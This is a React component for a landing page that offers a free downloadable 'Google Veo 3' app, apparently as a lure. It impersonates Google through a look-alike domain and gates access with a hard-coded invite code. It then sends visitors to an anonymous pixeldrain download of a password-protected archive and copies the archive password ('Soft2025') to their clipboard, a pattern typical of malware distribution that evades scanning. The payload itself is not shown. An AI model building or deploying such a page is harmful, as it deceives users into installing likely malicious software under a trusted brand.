
import React, { useState, useRef } from 'react';
import { Copy, Check, Play, Pause } from 'lucide-react';
import { useIntersectionObserver } from '../hooks/useIntersectionObserver';
import TypingAnimation from './TypingAnimation';

interface HeroSectionProps {
  hasAccess: boolean;
  onAccessGranted: () => void;
}

const HeroSection: React.FC<HeroSectionProps> = ({ hasAccess, onAccessGranted }) => {
  const [showInviteInput, setShowInviteInput] = useState(false);
  const [inviteCode, setInviteCode] = useState('');
  const [error, setError] = useState('');
  const [copied, setCopied] = useState(false);
  const [isVideoPlaying, setIsVideoPlaying] = useState(true);
  const [videoLoaded, setVideoLoaded] = useState(false);
  
  const { ref, isIntersecting } = useIntersectionObserver();
  const videoRef = useRef<HTMLVideoElement>(null);

  const handleGetAccess = () => {
    if (hasAccess) return;
    setShowInviteInput(true);
  };

  const handleInviteSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (inviteCode.trim() === 'Veo3FreeNow!') {
      setError('');
      onAccessGranted();
      setShowInviteInput(false);
    } else {
      setError('Invalid access code. Please try again.');
    }
  };

  const handleCopyPassword = async () => {
    try {
      await navigator.clipboard.writeText('Soft2025');
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const handleDownload = () => {
    window.open('https://pixeldrain.com/api/file/qYNYLRhk?download', '_blank');
  };

  const toggleVideoPlayback = () => {
    if (videoRef.current && videoLoaded) {
      if (isVideoPlaying) {
        videoRef.current.pause();
      } else {
        videoRef.current.play();
      }
      setIsVideoPlaying(!isVideoPlaying);
    }
  };

  const handleVideoLoad = () => {
    console.log('Hero video loaded successfully');
    setVideoLoaded(true);
  };

  const handleVideoError = (e: any) => {
    console.error('Hero video failed to load:', e);
    setVideoLoaded(false);
  };

  return (
    <section 
      ref={ref}
      className="relative min-h-screen flex items-center justify-center overflow-hidden bg-black"
    >
      {/* Video Background */}
      <video
        ref={videoRef}
        className="absolute top-0 left-0 w-full h-full object-cover z-0"
        autoPlay
        muted
        loop
        playsInline
        onLoadedData={handleVideoLoad}
        onError={handleVideoError}
        onCanPlay={handleVideoLoad}
        style={{ 
          opacity: videoLoaded ? 0.8 : 0,
          transition: 'opacity 1s ease-in-out'
        }}
      >
        <source src="https://google-veo3.com/background.mp4" type="video/mp4" />
      </video>
      
      {/* Video Overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-black/60 via-transparent to-black/60 z-1" />

      {/* Video Play/Pause Control - only show if video is loaded */}
      {videoLoaded && (
        <button
          onClick={toggleVideoPlayback}
          className="absolute bottom-8 right-8 z-20 glass p-3 rounded-full hover:bg-white/20 transition-all duration-300 opacity-70 hover:opacity-100"
          title={isVideoPlaying ? "Pause video" : "Play video"}
        >
          {isVideoPlaying ? (
            <Pause size={20} strokeWidth={1} className="text-white" />
          ) : (
            <Play size={20} strokeWidth={1} className="text-white" />
          )}
        </button>
      )}

      {/* Content */}
      <div className={`relative z-10 text-center px-4 max-w-4xl mx-auto animate-in ${
        isIntersecting ? 'visible' : ''
      }`}>
        <h1 className="text-5xl md:text-7xl font-light text-white mb-6 tracking-tighter text-shadow">
          The Future of Video
          <br />
          <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
            <TypingAnimation 
              text="Starts Here"
              speed={150}
              className="inline-block"
              shouldStart={isIntersecting}
            />
          </span>
        </h1>
        
        <p className="text-xl md:text-2xl text-white/90 mb-12 font-light leading-relaxed text-shadow">
          Create photorealistic, cinematic videos from simple text prompts using Google Veo 3 — for free.
        </p>

        <div className="flex flex-col items-center space-y-4">
          {!hasAccess ? (
            <>
              {!showInviteInput ? (
                <button
                  onClick={handleGetAccess}
                  className="neuro-button px-8 py-4 text-white font-light text-lg tracking-wide hover:animate-glow"
                >
                  Get Early Access
                </button>
              ) : (
                <form onSubmit={handleInviteSubmit} className="glass-card p-6 w-full max-w-md">
                  <div className="mb-4">
                    <label className="block text-white/70 text-sm font-light mb-2">
                      Enter invite code
                    </label>
                    <input
                      type="text"
                      value={inviteCode}
                      onChange={(e) => {
                        setInviteCode(e.target.value);
                        setError('');
                      }}
                      className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      placeholder="Your invite code"
                      autoFocus
                    />
                    {error && (
                      <p className="text-red-400 text-sm mt-2 font-light">{error}</p>
                    )}
                  </div>
                  <button
                    type="submit"
                    className="neuro-button w-full px-6 py-3 text-white font-light"
                  >
                    Verify Access
                  </button>
                </form>
              )}
            </>
          ) : (
            <div className="space-y-4">
              <button
                onClick={handleDownload}
                className="neuro-button px-8 py-4 text-white font-light text-lg tracking-wide hover:animate-glow"
              >
                Download Veo 3 App
              </button>
              
              <div className="relative">
                <button
                  onClick={handleCopyPassword}
                  className="glass px-6 py-2 text-white/70 hover:text-white transition-colors duration-300 font-light text-sm tracking-wide flex items-center space-x-2 group"
                  title={copied ? "Copied!" : "Copy Archive Password"}
                >
                  {copied ? (
                    <>
                      <Check size={16} strokeWidth={1} />
                      <span>Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy size={16} strokeWidth={1} />
                      <span>Copy Archive Password</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </section>
  );
};

export default HeroSection;
